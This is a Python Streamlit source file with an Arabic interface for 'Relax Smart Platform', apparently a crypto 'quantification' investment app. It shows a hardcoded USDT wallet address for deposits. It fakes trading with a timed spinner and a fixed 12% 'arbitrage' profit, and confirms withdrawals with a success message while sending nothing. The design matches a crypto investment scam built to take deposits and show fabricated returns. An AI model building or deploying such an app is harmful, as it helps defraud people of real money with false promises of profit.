import streamlit as st
import time

# إعدادات المنصة
st.set_page_config(page_title="Relax Smart Platform", page_icon="🟢", layout="centered")

# --- تنسيق احترافي ---
st.markdown("""
    <style>
    .stButton>button { width: 100%; border-radius: 15px; height: 3.5em; font-weight: bold; }
    .main-box { background-color: #ffffff; padding: 20px; border-radius: 15px; border: 1px solid #e1e4e8; text-align: center; }
    .status-off { color: #888; font-size: 14px; }
    .status-on { color: #28a745; font-weight: bold; }
    </style>
    """, unsafe_allow_html=True)

# --- نظام الحساب (يبدأ دائماً بصفر) ---
if 'balance_profit' not in st.session_state:
    st.session_state.balance_profit = 0.0
if 'initial_deposit' not in st.session_state:
    st.session_state.initial_deposit = 0.0
if 'is_quantifying' not in st.session_state:
    st.session_state.is_quantifying = False

# القائمة الجانبية
st.sidebar.title("💎 Relax Smart")
menu = st.sidebar.radio("انتقل إلى:", ["🏠 الرئيسية", "📊 تحديد الكمية", "📤 ينسحب"])

# --- 🏠 الصفحة الرئيسية ---
if menu == "🏠 الرئيسية":
    st.markdown("<h2 style='text-align: center;'>الرئيسية</h2>", unsafe_allow_html=True)
    st.markdown("<div class='main-box'>", unsafe_allow_html=True)
    st.write("إجمالي الأصول المستثمرة")
    st.subheader(f"{st.session_state.initial_deposit} USDT")
    st.markdown("</div>", unsafe_allow_html=True)
    
    st.divider()
    with st.expander("📥 تعبئة رصيد (إيداع)"):
        st.write("حول USDT (BEP20) للعنوان:")
        st.code("0x05aec19d3d5e5cb9400caff56ab69c3799019942")
        if st.button("تأكيد الإيداع"):
            st.success("تم إرسال الطلب للمراجعة.")

# --- 📊 صفحة تحديد الكمية (الشرط الأساسي) ---
elif menu == "📊 تحديد الكمية":
    st.markdown("<h2 style='text-align: center;'>تحديد الكمية الذكي</h2>", unsafe_allow_html=True)
    
    # التحقق من وجود إيداع
    if st.session_state.initial_deposit <= 0:
        st.error("❌ لا يمكنك تشغيل التحديد الكمي. رصيد الإيداع الحالي هو 0.")
        st.info("يرجى الذهاب للرئيسية وتعبئة الرصيد أولاً.")
    else:
        st.success(f"✅ رصيدك المتاح للتشغيل: {st.session_state.initial_deposit} USDT")
        if st.button("🚀 بدء التحديد الكمي المباشر"):
            with st.spinner('جاري مسح أسعار السوق وتنفيذ صفقات Arbitrage...'):
                time.sleep(5)
                # حساب الربح (مثال: 12% من الإيداع)
                profit = st.session_state.initial_deposit * 0.12
                st.session_state.balance_profit += profit
                st.balloons()
                st.success(f"تم تحقيق ربح بقيمة {profit} USDT وإضافتها لمحفظة الأرباح.")

# --- 📤 صفحة ينسحب (الحماية من السحب العشوائي) ---
elif menu == "📤 ينسحب":
    st.markdown("<h2 style='text-align: center;'>سحب الأرباح</h2>", unsafe_allow_html=True)
    
    # قفل السحب إذا لم يكن هناك أرباح
    if st.session_state.balance_profit <= 0:
        st.error("❌ رصيد الأرباح المتاح للسحب هو 0.00 USDT")
        st.warning("يجب عليك الإيداع ثم تشغيل 'تحديد الكمية' أولاً لتتمكن من السحب.")
        st.button("تأكيد السحب", disabled=True) # الزر معطل تماماً
    else:
        st.success(f"رصيدك القابل للسحب: {st.session_state.balance_profit} USDT")
        amt = st.number_input("المبلغ المراد سحبه", min_value=10.0, max_value=st.session_state.balance_profit)
        addr = st.text_input("عنوان المحفظة (BEP20)")
        if st.button("تأكيد السحب"):
            st.success("تم إرسال طلب السحب بنجاح. سيصلك خلال 24 ساعة.")
